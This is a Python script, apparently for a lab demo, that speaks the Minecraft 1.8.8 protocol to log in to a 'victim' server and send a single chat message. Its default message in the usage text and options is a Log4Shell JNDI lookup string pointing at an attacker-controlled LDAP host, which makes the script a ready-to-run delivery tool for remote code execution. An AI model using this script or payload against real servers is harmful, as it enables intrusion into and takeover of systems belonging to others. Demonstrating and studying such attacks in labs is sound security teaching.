#!/usr/bin/env python3
"""Minimal Minecraft Java Edition 1.8.8 chat sender for the EHAX demo.

Why this exists:
  The demo needs a normal player chat message to reach the victim server's
  log.  A full Minecraft client + account is unnecessary.  This script speaks
  just enough of the 1.8.8 protocol to log in to an offline-mode server and
  send one chat message.  It is not a game client and does nothing else.

Usage:
  python3 chat-send.py --host 10.10.10.20 --port 25565 \
      --message '${jndi:ldap://10.10.10.10:1389/a}'

If --message is omitted, the prompt asks for one (press Enter for the default).
"""
from __future__ import annotations

import argparse
import socket
import struct
import sys
import time
import zlib


PROTOCOL_1_8_8 = 47
CHAT_LIMIT = 100


class ProtocolError(RuntimeError):
    pass


def encode_varint(value: int) -> bytes:
    value &= 0xFFFFFFFF
    out = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            out.append(byte | 0x80)
        else:
            out.append(byte)
            return bytes(out)


def decode_varint(data: bytes, offset: int = 0) -> tuple[int, int]:
    result = 0
    shift = 0
    while True:
        if offset >= len(data):
            raise ProtocolError("truncated VarInt")
        byte = data[offset]
        offset += 1
        result |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            return result, offset
        shift += 7
        if shift > 35:
            raise ProtocolError("VarInt too long")


def encode_string(value: str) -> bytes:
    raw = value.encode("utf-8")
    return encode_varint(len(raw)) + raw


def read_exact(sock: socket.socket, length: int) -> bytes:
    chunks = []
    remaining = length
    while remaining:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ProtocolError("connection closed by server")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_varint(sock: socket.socket) -> int:
    result = 0
    shift = 0
    while True:
        raw = read_exact(sock, 1)
        byte = raw[0]
        result |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            return result
        shift += 7
        if shift > 35:
            raise ProtocolError("VarInt too long")


def recv_frame(sock: socket.socket) -> bytes:
    length = recv_varint(sock)
    if length < 0 or length > 2 * 1024 * 1024:
        raise ProtocolError(f"unreasonable frame length: {length}")
    return read_exact(sock, length)


def decode_frame(frame: bytes, compression_threshold: int | None) -> bytes:
    if compression_threshold is None or compression_threshold < 0:
        return frame
    uncompressed_length, offset = decode_varint(frame, 0)
    payload = frame[offset:]
    if uncompressed_length == 0:
        return payload
    if uncompressed_length > 2 * 1024 * 1024:
        raise ProtocolError("unreasonable uncompressed length")
    try:
        return zlib.decompress(payload)
    except zlib.error as exc:
        raise ProtocolError(f"bad compressed packet: {exc}") from exc


def encode_frame(payload: bytes, compression_threshold: int | None) -> bytes:
    if compression_threshold is None or compression_threshold < 0:
        return encode_varint(len(payload)) + payload
    if len(payload) < compression_threshold:
        body = encode_varint(0) + payload
    else:
        compressed = zlib.compress(payload)
        body = encode_varint(len(payload)) + compressed
    return encode_varint(len(body)) + body


def send_packet(sock: socket.socket, packet_id: int, payload: bytes,
                compression_threshold: int | None) -> None:
    packet = encode_varint(packet_id) + payload
    sock.sendall(encode_frame(packet, compression_threshold))


def receive_login(sock: socket.socket) -> tuple[int, str]:
    """Read login packets until Login Success. Returns (protocol state, name)."""
    compression: int | None = None
    deadline = time.time() + 8
    while time.time() < deadline:
        frame = recv_frame(sock)
        packet = decode_frame(frame, compression)
        packet_id, offset = decode_varint(packet, 0)
        body = packet[offset:]

        if packet_id == 0x03:  # Set Compression
            threshold, _ = decode_varint(body, 0)
            compression = threshold
            print(f"[client] compression enabled (threshold={threshold})")
            continue

        if packet_id == 0x00:  # Disconnect
            # String length + UTF-8 JSON
            length, off = decode_varint(body, 0)
            reason = body[off:off + length].decode("utf-8", "replace")
            raise ProtocolError(f"server disconnected: {reason}")

        if packet_id == 0x02:  # Login Success
            # UUID string then username string
            uuid_len, off = decode_varint(body, 0)
            _uuid = body[off:off + uuid_len].decode("ascii", "replace")
            off += uuid_len
            name_len, off2 = decode_varint(body, off)
            name = body[off2:off2 + name_len].decode("utf-8", "replace")
            return (-1 if compression is None else compression), name

        # Ignore other login-state packets (there should not be any here).
        print(f"[client] ignoring login packet 0x{packet_id:02x}")

    raise ProtocolError("timed out waiting for Login Success")


def send_chat(host: str, port: int, username: str, message: str,
              wait_seconds: float = 2.0) -> None:
    if len(message) > CHAT_LIMIT:
        raise ProtocolError(f"chat message is {len(message)} chars; "
                            f"Minecraft 1.8.8 limit is {CHAT_LIMIT}")
    if not username or len(username) > 16:
        raise ProtocolError("username must be 1-16 characters")

    print(f"[client] connecting to {host}:{port} as {username}")
    with socket.create_connection((host, port), timeout=8) as sock:
        sock.settimeout(8)
        # Handshake -> login
        handshake = (
            encode_varint(PROTOCOL_1_8_8)
            + encode_string(host)
            + struct.pack(">H", port)
            + encode_varint(2)
        )
        send_packet(sock, 0x00, handshake, None)
        # Login Start
        send_packet(sock, 0x00, encode_string(username), None)

        compression, actual_name = receive_login(sock)
        print(f"[client] logged in as {actual_name}")

        # Let the server finish sending Join Game before the chat packet.
        # Sending it in the same TCP read as the login handshake can race the
        # server's state transition on 1.8.8.
        time.sleep(0.7)

        # Play state: Chat Message (0x01)
        send_packet(sock, 0x01, encode_string(message), compression)
        print(f"[client] sent chat: {message}")
        time.sleep(wait_seconds)


def main() -> int:
    parser = argparse.ArgumentParser(description="Send one Minecraft 1.8.8 chat message")
    parser.add_argument("--host", default="10.10.10.20", help="victim Minecraft server IP")
    parser.add_argument("--port", type=int, default=25565)
    parser.add_argument("--user", default="EHAX_Guest")
    parser.add_argument("--message", default=None,
                        help="chat message; if omitted, prompt interactively")
    parser.add_argument("--default", default="${jndi:ldap://10.10.10.10:1389/a}",
                        help="default message for the interactive prompt")
    args = parser.parse_args()

    message = args.message
    if message is None:
        try:
            typed = input(f"Chat message (Enter = default): ").strip()
        except EOFError:
            typed = ""
        message = typed or args.default

    try:
        send_chat(args.host, args.port, args.user, message)
    except (ProtocolError, OSError) as exc:
        print(f"[client] ERROR: {exc}", file=sys.stderr)
        return 1
    print("[client] done")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
